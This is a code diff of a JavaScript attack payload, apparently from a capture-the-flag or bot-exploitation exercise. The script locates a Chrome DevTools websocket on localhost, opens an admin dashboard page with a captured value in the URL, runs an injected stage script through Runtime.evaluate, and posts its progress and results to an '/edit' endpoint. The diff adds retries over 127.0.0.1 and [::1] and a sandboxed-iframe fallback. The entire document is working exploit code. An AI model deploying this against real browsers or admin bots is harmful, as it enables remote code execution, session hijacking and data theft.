@@ -1,5 +1,5 @@
 (async()=>{
-const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
+const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
 const read=async p=>{
  try{
   let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
@@ -45,6 +45,7 @@ const wsFrom=async dir=>{
   let id=(d.match(/(?:browser|devtools)[^A-Za-z0-9]+([A-Za-z0-9.-]{20,})/)||[])[1]||'';
   if(id)path='/devtools/browser/'+id;
  }
+ post('parsed '+port+' '+path);
  if(!port||!path)return '';
  return 'ws://localhost:'+port+path;
 };
@@ -70,9 +71,62 @@ const findWs=async()=>{
  }
  return '';
 };
-const run=wsurl=>{
- post('ws '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
- let ws=new WebSocket(wsurl),id=0,wait={};
+const frameRun=urls=>{
+ window.addEventListener('message',e=>{
+  if(e.data&&e.data.cdpLog)post('df '+e.data.cdpLog);
+ });
+ let code=`(()=> {
+const log=t=>parent.postMessage({cdpLog:String(t)},'*');
+const urls=${JSON.stringify(urls)};
+const ck=${JSON.stringify(ck)};
+const stage=${JSON.stringify(stage)};
+let pos=0;
+const start=()=>{
+ let wsurl=urls[pos++];
+ if(!wsurl){log('ws all failed');return}
+ log('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
+ let ws,id=0,wait={},opened=false;
+ try{ws=new WebSocket(wsurl)}catch(e){log('ws ctor '+e.name+' '+e.message);start();return}
+ const send=(method,params={},sid='')=>new Promise((res,rej)=>{
+  let n=++id;
+  wait[n]=res;
+  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
+  setTimeout(()=>rej(new Error('timeout '+method)),8000);
+ });
+ ws.onerror=()=>log('ws error');
+ ws.onclose=()=>{if(!opened){log('ws close before open');start()}};
+ ws.onmessage=e=>{
+  let m=JSON.parse(e.data);
+  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
+ };
+ ws.onopen=async()=>{
+  opened=true;
+  try{
+   log('ws open');
+   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
+   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
+   log('target attach');
+   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
+   log('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
+  }catch(e){log('err '+e.name+' '+e.message)}
+ };
+};
+start();
+})()`;
+ let f=document.createElement('iframe');
+ f.sandbox='allow-scripts';
+ f.srcdoc='<script>'+code.split('</script').join('<\\/script')+'</script>';
+ document.body.appendChild(f);
+};
+
+const run=(urls,fail)=>{
+ let pos=0;
+ const start=()=>{
+ let wsurl=urls[pos++];
+ if(!wsurl){post('ws all failed');if(fail)fail();return}
+ post('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
+ let ws,id=0,wait={},opened=false;
+ try{ws=new WebSocket(wsurl)}catch(e){post('ws ctor '+e.name+' '+e.message);start();return}
  const send=(method,params={},sid='')=>new Promise((res,rej)=>{
   let n=++id;
   wait[n]=res;
@@ -80,11 +134,13 @@ const run=wsurl=>{
   setTimeout(()=>rej(new Error('timeout '+method)),8000);
  });
  ws.onerror=()=>post('ws error');
+ ws.onclose=()=>{if(!opened){post('ws close before open');start()}};
  ws.onmessage=e=>{
   let m=JSON.parse(e.data);
   if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
  };
  ws.onopen=async()=>{
+  opened=true;
   try{
    post('ws open');
    let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
@@ -94,10 +150,13 @@ const run=wsurl=>{
    post('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
   }catch(e){post('err '+e.name+' '+e.message)}
  };
+ };
+ start();
 };
 
-post('cdp dyn 0615ab');
+post('cdp dyn 0615ad');
 let wsurl=await findWs();
 if(!wsurl){post('ws none');return}
-run(wsurl);
+let urls=[wsurl,wsurl.replace('ws://localhost:','ws://127.0.0.1:'),wsurl.replace('ws://localhost:','ws://[::1]:')];
+run(urls,()=>frameRun(urls));
 })();
